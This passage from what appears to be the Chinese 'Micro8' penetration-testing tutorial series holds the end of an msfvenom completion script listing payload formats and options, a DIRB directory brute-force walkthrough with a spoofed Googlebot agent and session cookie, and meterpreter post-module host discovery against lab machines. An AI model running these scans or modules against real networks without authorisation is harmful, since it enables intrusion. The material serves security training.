class="line">&apos;hpux&apos;</span><br><span class="line">&apos;irix&apos;</span><br><span class="line">&apos;java&apos;</span><br><span class="line">&apos;javascript&apos;</span><br><span class="line">&apos;juniper&apos;</span><br><span class="line">&apos;linux&apos;</span><br><span class="line">&apos;mainframe&apos;</span><br><span class="line">&apos;multi&apos;</span><br><span class="line">&apos;netbsd&apos;</span><br><span class="line">&apos;netware&apos;</span><br><span class="line">&apos;nodejs&apos;</span><br><span class="line">&apos;openbsd&apos;</span><br><span class="line">&apos;osx&apos;</span><br><span class="line">&apos;php&apos;</span><br><span class="line">&apos;python&apos;</span><br><span class="line">&apos;r&apos;</span><br><span class="line">&apos;ruby&apos;</span><br><span class="line">&apos;solaris&apos;</span><br><span class="line">&apos;unix&apos;</span><br><span class="line">&apos;unknown&apos;</span><br><span class="line">&apos;windows&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for line in $platforms; do</span><br><span class="line">echo &quot;$line&quot;</span><br><span class="line">done</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">__msfvenom_formats()&#123;</span><br><span class="line">local formats</span><br><span class="line">formats=(</span><br><span class="line">&apos;asp&apos;</span><br><span class="line">&apos;aspx&apos;</span><br><span class="line">&apos;aspx‐exe&apos;</span><br><span class="line">&apos;axis2&apos;</span><br><span class="line">&apos;dll&apos;</span><br><span class="line">&apos;elf&apos;</span><br><span class="line">&apos;elf‐so&apos;</span><br><span class="line">&apos;exe&apos;</span><br><span class="line">&apos;exe‐only&apos;</span><br><span class="line">&apos;exe‐service&apos;</span><br><span class="line">&apos;exe‐small&apos;</span><br><span class="line">&apos;hta‐psh&apos;</span><br><span class="line">&apos;jar&apos;</span><br><span class="line">&apos;jsp&apos;</span><br><span class="line">&apos;loop‐vbs&apos;</span><br><span class="line">&apos;macho&apos;</span><br><span class="line">&apos;msi&apos;</span><br><span class="line">&apos;msi‐nouac&apos;</span><br><span class="line">&apos;osx‐app&apos;</span><br><span class="line">&apos;psh&apos;</span><br><span class="line">&apos;psh‐cmd&apos;</span><br><span class="line">&apos;psh‐net&apos;</span><br><span class="line">&apos;psh‐reflection&apos;</span><br><span class="line">&apos;vba&apos;</span><br><span class="line">&apos;vba‐exe&apos;</span><br><span class="line">&apos;vba‐psh&apos;</span><br><span class="line">&apos;vbs&apos;</span><br><span class="line">&apos;war&apos;</span><br><span class="line">&apos;bash&apos;</span><br><span class="line">&apos;c&apos;</span><br><span class="line">&apos;csharp&apos;</span><br><span class="line">&apos;dw&apos;</span><br><span class="line">&apos;dword&apos;</span><br><span class="line">&apos;hex&apos;</span><br><span class="line">&apos;java&apos;</span><br><span class="line">&apos;js_be&apos;</span><br><span class="line">&apos;js_le&apos;</span><br><span class="line">&apos;num&apos;</span><br><span class="line">&apos;perl&apos;</span><br><span class="line">&apos;pl&apos;</span><br><span class="line">&apos;powershell&apos;</span><br><span class="line">&apos;ps1&apos;</span><br><span class="line">&apos;py&apos;</span><br><span class="line">&apos;python&apos;</span><br><span class="line">&apos;raw&apos;</span><br><span class="line">&apos;rb&apos;</span><br><span class="line">&apos;ruby&apos;</span><br><span class="line">&apos;sh&apos;</span><br><span class="line">&apos;vbapplication&apos;</span><br><span class="line">&apos;vbscript&apos;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for line in $formats; do</span><br><span class="line">echo &quot;$line&quot;</span><br><span class="line">done</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"># For most common options, not accurately</span><br><span class="line">__msfvenom_options()&#123;</span><br><span class="line">local options</span><br><span class="line">options=(</span><br><span class="line">LHOST= \</span><br><span class="line">LPORT= \</span><br><span class="line">EXITFUNC= \</span><br><span class="line">RHOST= \</span><br><span class="line">StageEncoder= \</span><br><span class="line">AutoLoadStdapi= \</span><br><span class="line">AutoRunScript= \</span><br><span class="line">AutoSystemInfo= \</span><br><span class="line">AutoVerifySession= \</span><br><span class="line">AutoVerifySessionTimeout= \</span><br><span class="line">EnableStageEncoding= \</span><br><span class="line">EnableUnicodeEncoding= \</span><br><span class="line">HandlerSSLCert= \</span><br><span class="line">InitialAutoRunScript= \</span><br><span class="line">PayloadBindPort= \</span><br><span class="line">PayloadProcessCommandLine= \</span><br><span class="line">PayloadUUIDName= \</span><br><span class="line">PayloadUUIDRaw= \</span><br><span class="line">PayloadUUIDSeed= \</span><br><span class="line">PayloadUUIDTracking= \</span><br><span class="line">PrependMigrate= \</span><br><span class="line">PrependMigrateProc= \</span><br><span class="line">ReverseAllowProxy= \</span><br><span class="line">ReverseListenerBindAddress= \</span><br><span class="line">ReverseListenerBindPort= \</span><br><span class="line">ReverseListenerComm= \</span><br><span class="line">ReverseListenerThreaded= \</span><br><span class="line">SessionCommunicationTimeout= \</span><br><span class="line">SessionExpirationTimeout= \</span><br><span class="line">SessionRetryTotal= \</span><br><span class="line">SessionRetryWait= \</span><br><span class="line">StageEncoder= \</span><br><span class="line">StageEncoderSaveRegisters= \</span><br><span class="line">StageEncodingFallback= \</span><br><span class="line">StagerRetryCount= \</span><br><span class="line">StagerRetryWait= \</span><br><span class="line">VERBOSE= \</span><br><span class="line">WORKSPACE=</span><br><span class="line">) </span><br><span class="line"></span><br><span class="line">echo $options</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#_msfvenom &quot;$@&quot;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>29、发现目标WEB程序敏感目录第一季</title>
      <link href="/article/29_%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87WEB%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E7%AC%AC%E4%B8%80%E5%AD%A3.html"/>
      <url>/article/29_%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87WEB%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E7%AC%AC%E4%B8%80%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p>DIRB官方地址：<br><a href="http://dirb.sourceforge.net/" target="_blank" rel="noopener">http://dirb.sourceforge.net/</a></p><h3 id="简介（摘自官方原文）："><a href="#简介（摘自官方原文）：" class="headerlink" title="简介（摘自官方原文）："></a>简介（摘自官方原文）：</h3><blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analizing the response.</p></blockquote><h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>DIRB是一个基于命令行的工具，依据字典来爆破目标Web路径以及敏感文件，它支持自定义UA，cookie，忽略指定响应吗，支持代理扫描，自定义毫秒延迟，证书加载扫描等。是一款非常优秀的全方位的目录扫描工具。同样Kaili内置了dirb。</p><p><strong>攻击机：</strong><br>192.168.1.104 Debian<br><strong>靶机：</strong><br>192.168.1.102 Windows 2003 IIS</p><p><img src="../do/media/c3fcc5b823e0595a4cfc3182450ede90.jpg" alt></p><h3 id="普通爆破："><a href="#普通爆破：" class="headerlink" title="普通爆破："></a>普通爆破：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">START_TIME: Sun Feb 17 23:26:52 2019</span><br><span class="line">URL_BASE: http://192.168.1.102/</span><br><span class="line">WORDLIST_FILES: ./ASPX.txt </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 822 </span><br><span class="line"></span><br><span class="line">‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐</span><br><span class="line">+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2749)</span><br><span class="line">+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203) </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">END_TIME: Sun Feb 17 23:26:56 2019</span><br><span class="line">DOWNLOADED: 822 ‐ FOUND: 2</span><br></pre></td></tr></table></figure><p><img src="../do/media/db482720c37469309590eccaa2eebb95.jpg" alt></p><h3 id="多字典挂载："><a href="#多字典挂载：" class="headerlink" title="多字典挂载："></a>多字典挂载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt,./DIR.txt</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">START_TIME: Sun Feb 17 23:31:02 2019</span><br><span class="line">URL_BASE: http://192.168.1.102/</span><br><span class="line">WORDLIST_FILES: ./ASPX.txt,./DIR.txt </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 1975 </span><br><span class="line"></span><br><span class="line">‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐</span><br><span class="line">+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2749)</span><br><span class="line">+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203)</span><br><span class="line">+ http://192.168.1.102//bbs (CODE:301|SIZE:148)</span><br><span class="line">+ http://192.168.1.102//manage (CODE:301|SIZE:151)</span><br><span class="line">+ http://192.168.1.102//manage/ (CODE:302|SIZE:203)</span><br><span class="line">+ http://192.168.1.102//kindeditor/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102//robots.txt (CODE:200|SIZE:214)</span><br><span class="line">+ http://192.168.1.102//Web.config (CODE:302|SIZE:130)</span><br><span class="line">+ http://192.168.1.102//files (CODE:301|SIZE:150)</span><br><span class="line">+ http://192.168.1.102//install (CODE:301|SIZE:152) </span><br><span class="line"></span><br><span class="line">(!) FATAL: Too many errors connecting to host</span><br><span class="line">(Possible cause: EMPTY REPLY FROM SERVER) </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">END_TIME: Sun Feb 17 23:31:06 2019</span><br><span class="line">DOWNLOADED: 1495 ‐ FOUND: 10</span><br></pre></td></tr></table></figure><p><img src="../do/media/544ad274590fbcca704dd16b8186fb39.jpg" alt></p><h3 id="自定义UA："><a href="#自定义UA：" class="headerlink" title="自定义UA："></a>自定义UA：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/wordlist/small# dirb http://192.168.1.102 ./ASPX.txt ‐a &quot;M</span><br><span class="line">ozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot;</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">START_TIME: Sun Feb 17 23:34:51 2019</span><br><span class="line">URL_BASE: http://192.168.1.102/</span><br><span class="line">WORDLIST_FILES: ./ASPX.txt</span><br><span class="line">USER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 822</span><br><span class="line"></span><br><span class="line">‐‐‐‐ Scanning URL: http://192.168.1.102/ ‐‐‐‐</span><br><span class="line">+ http://192.168.1.102//Index.aspx (CODE:200|SIZE:2735)</span><br><span class="line">+ http://192.168.1.102//Manage/Default.aspx (CODE:302|SIZE:203) </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">END_TIME: Sun Feb 17 23:34:54 2019</span><br><span class="line">DOWNLOADED: 822 ‐ FOUND: 2</span><br></pre></td></tr></table></figure><p><img src="../do/media/3d67b8846183b7172757f29b6420349f.jpg" alt></p><h3 id="自定义cookie："><a href="#自定义cookie：" class="headerlink" title="自定义cookie："></a>自定义cookie：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/wordlist/small# dirb http://192.168.1.102/Manage ./DIR.txt</span><br><span class="line">‐a &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.ht</span><br><span class="line">ml)&quot; ‐c &quot;ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45&quot;</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">START_TIME: Sun Feb 17 23:53:08 2019</span><br><span class="line">URL_BASE: http://192.168.1.102/Manage/</span><br><span class="line">WORDLIST_FILES: ./DIR.txt</span><br><span class="line">USER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.googl</span><br><span class="line">e.com/bot.html)</span><br><span class="line">COOKIE: ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45 </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 1153 </span><br><span class="line"></span><br><span class="line">‐‐‐‐ Scanning URL: http://192.168.1.102/Manage/ ‐‐‐‐</span><br><span class="line">+ http://192.168.1.102/Manage//include/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//news/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//include (CODE:301|SIZE:159)</span><br><span class="line">+ http://192.168.1.102/Manage//images/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//sys/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//images (CODE:301|SIZE:158) </span><br><span class="line"></span><br><span class="line">(!) FATAL: Too many errors connecting to host</span><br><span class="line">(Possible cause: EMPTY REPLY FROM SERVER) </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">END_TIME: Sun Feb 17 23:53:10 2019</span><br><span class="line">DOWNLOADED: 673 ‐ FOUND: 6</span><br></pre></td></tr></table></figure><h3 id="自定义毫秒延迟："><a href="#自定义毫秒延迟：" class="headerlink" title="自定义毫秒延迟："></a>自定义毫秒延迟：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@John:~/wordlist/small# dirb http://192.168.1.102/Manage ./DIR.txt</span><br><span class="line">‐a &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.ht</span><br><span class="line">ml)&quot; ‐c &quot;ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45&quot; ‐z 100</span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">START_TIME: Sun Feb 17 23:54:29 2019</span><br><span class="line">URL_BASE: http://192.168.1.102/Manage/</span><br><span class="line">WORDLIST_FILES: ./DIR.txt</span><br><span class="line">USER_AGENT: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.googl</span><br><span class="line">e.com/bot.html)</span><br><span class="line">COOKIE: ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45</span><br><span class="line">SPEED_DELAY: 100 milliseconds </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 1153 </span><br><span class="line"></span><br><span class="line">‐‐‐‐ Scanning URL: http://192.168.1.102/Manage/ ‐‐‐‐</span><br><span class="line">+ http://192.168.1.102/Manage//include/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//news/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//include (CODE:301|SIZE:159)</span><br><span class="line">+ http://192.168.1.102/Manage//images/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//sys/ (CODE:403|SIZE:218)</span><br><span class="line">+ http://192.168.1.102/Manage//images (CODE:301|SIZE:158) </span><br><span class="line"></span><br><span class="line">(!) FATAL: Too many errors connecting to host</span><br><span class="line">(Possible cause: EMPTY REPLY FROM SERVER) </span><br><span class="line"></span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐</span><br><span class="line">END_TIME: Sun Feb 17 23:55:50 2019</span><br><span class="line">DOWNLOADED: 673 ‐ FOUND: 6</span><br></pre></td></tr></table></figure><p><img src="../do/media/5c184a09832f6e4b1d2df8b80c2b7c1f.jpg" alt></p><h3 id="其他更多有趣的功能："><a href="#其他更多有趣的功能：" class="headerlink" title="其他更多有趣的功能："></a>其他更多有趣的功能：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ </span><br><span class="line"></span><br><span class="line">dirb &lt;url_base&gt; [&lt;wordlist_file(s)&gt;] [options] </span><br><span class="line"></span><br><span class="line">========================= NOTES =========================</span><br><span class="line">&lt;url_base&gt; : Base URL to scan. (Use ‐resume for session resuming)</span><br><span class="line">&lt;wordlist_file(s)&gt; : List of wordfiles. (wordfile1,wordfile2,wordfile3...)</span><br><span class="line"></span><br><span class="line">======================== HOTKEYS ========================</span><br><span class="line">&apos;n&apos; ‐&gt; Go to next directory.</span><br><span class="line">&apos;q&apos; ‐&gt; Stop scan. (Saving state for resume)</span><br><span class="line">&apos;r&apos; ‐&gt; Remaining scan stats.</span><br><span class="line"></span><br><span class="line">======================== OPTIONS ========================</span><br><span class="line">‐a &lt;agent_string&gt; : Specify your custom USER_AGENT.</span><br><span class="line">‐b : Use path as is.</span><br><span class="line">‐c &lt;cookie_string&gt; : Set a cookie for the HTTP request.</span><br><span class="line">‐E &lt;certificate&gt; : path to the client certificate.</span><br><span class="line">‐f : Fine tunning of NOT_FOUND (404) detection.</span><br><span class="line">‐H &lt;header_string&gt; : Add a custom header to the HTTP request.</span><br><span class="line">‐i : Use case‐insensitive search.</span><br><span class="line">‐l : Print &quot;Location&quot; header when found.</span><br><span class="line">‐N &lt;nf_code&gt;: Ignore responses with this HTTP code.</span><br><span class="line">‐o &lt;output_file&gt; : Save output to disk.</span><br><span class="line">‐p &lt;proxy[:port]&gt; : Use this proxy. (Default port is 1080)</span><br><span class="line">‐P &lt;proxy_username:proxy_password&gt; : Proxy Authentication.</span><br><span class="line">‐r : Don&apos;t search recursively.</span><br><span class="line">‐R : Interactive recursion. (Asks for each directory)</span><br><span class="line">‐S : Silent Mode. Don&apos;t show tested words. (For dumb terminals)</span><br><span class="line">‐t : Don&apos;t force an ending &apos;/&apos; on URLs.</span><br><span class="line">‐u &lt;username:password&gt; : HTTP Authentication.</span><br><span class="line">‐v : Show also NOT_FOUND pages.</span><br><span class="line">‐w : Don&apos;t stop on WARNING messages.</span><br><span class="line">‐X &lt;extensions&gt; / ‐x &lt;exts_file&gt; : Append each word with this extensions.</span><br><span class="line">‐z &lt;millisecs&gt; : Add a milliseconds delay to not cause excessive Flood.</span><br><span class="line"></span><br><span class="line">======================== EXAMPLES =======================</span><br><span class="line">dirb http://url/directory/ (Simple Test)</span><br><span class="line">dirb http://url/ ‐X .html (Test files with &apos;.html&apos; extension)</span><br><span class="line">dirb http://url/ /usr/share/dirb/wordlists/vulns/apache.txt (Test wit hapache.txt wordlist)</span><br><span class="line">dirb https://secure_url/ (Simple Test with SSL)</span><br></pre></td></tr></table></figure><p><img src="../do/media/41381c9747125487e30cbbdc3acd039f.jpg" alt></p><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>28、基于MSF发现内网存活主机第六季</title>
      <link href="/article/28_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%85%AD%E5%AD%A3.html"/>
      <url>/article/28_%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%85%AD%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，可预防<strong>肾结石，通风</strong>等。如有肾囊肿，请定期检查肾囊肿的大小变化。</p><p><strong>攻击机：</strong><br>192.168.1.102 Debian</p><p><strong>靶机：</strong><br>192.168.1.2 Windows 7<br>192.168.1.115 Windows 2003<br>192.168.1.119 Windows 2003</p><p><strong>第一季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/discovery/arp_sweep </li><li>auxiliary/scanner/discovery/udp_sweep</li><li>auxiliary/scanner/ftp/ftp_version </li><li>auxiliary/scanner/http/http_version</li><li>auxiliary/scanner/smb/smb_version</li></ul><p><strong>第二季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/ssh/ssh_version </li><li>auxiliary/scanner/telnet/telnet_version</li><li>auxiliary/scanner/discovery/udp_probe </li><li>auxiliary/scanner/dns/dns_amp</li><li>auxiliary/scanner/mysql/mysql_version</li></ul><p><strong>第三季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/netbios/nbname </li><li>auxiliary/scanner/http/title</li><li>auxiliary/scanner/db2/db2_version </li><li>auxiliary/scanner/portscan/ack</li><li>auxiliary/scanner/portscan/tcp</li></ul><p><strong>第四季主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/portscan/syn </li><li>auxiliary/scanner/portscan/ftpbounce</li><li>auxiliary/scanner/portscan/xmas </li><li>auxiliary/scanner/rdp/rdp_scanner</li><li>auxiliary/scanner/smtp/smtp_version</li></ul><p><strong>第五季主要介绍scanner下的三个模块，以及db_nmap辅助发现内网存活主机，分别为：</strong></p><ul><li>auxiliary/scanner/pop3/pop3_version</li><li>auxiliary/scanner/postgres/postgres_version </li><li>auxiliary/scanner/ftp/anonymous</li><li>db_nmap</li></ul><p><strong>第六季主要介绍post下的六个模块，辅助发现内网存活主机，分别为：</strong></p><ul><li>windows/gather/arp_scanner </li><li>windows/gather/enum_ad_computers</li><li>windows/gather/enum_computers </li><li>windows/gather/enum_domain</li><li>windows/gather/enum_domains </li><li>windows/gather/enum_ad_user_comments</li></ul><p>在实战过程中，许多特殊环境下scanner，db_nmap不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而post下的模块，弥补了该诉求，以便快速了解域中存活主机。</p><h3 id="二十五：基于windows-gather-arp-scanner发现内网存活主机"><a href="#二十五：基于windows-gather-arp-scanner发现内网存活主机" class="headerlink" title="二十五：基于windows/gather/arp_scanner发现内网存活主机"></a>二十五：基于windows/gather/arp_scanner发现内网存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/arp_scanner RHOSTS=192.168.1.110‐120 THREADS=20</span><br><span class="line"></span><br><span class="line">[*] Running module against VM_2003X86</span><br><span class="line">[*] ARP Scanning 192.168.1.110‐120</span><br><span class="line">[+] IP: 192.168.1.115 MAC 00:0c:29:af:ce:cc (VMware, Inc.)</span><br><span class="line">[+] IP: 192.168.1.119 MAC 00:0c:29:85:d6:7d (VMware, Inc.)</span><br></pre></td></tr></table></figure><p><img src="../do/media/21a718cf4696c8d5f2290c93327dd924.jpg" alt></p><h3 id="二十六：基于windows-gather-enum-ad-computers发现域中存活主机"><a href="#二十六：基于windows-gather-enum-ad-computers发现域中存活主机" class="headerlink" title="二十六：基于windows/gather/enum_ad_computers发现域中存活主机"></a>二十六：基于windows/gather/enum_ad_computers发现域中存活主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/enum_ad_computers</span><br></pre></td></tr></table></figure><p><img 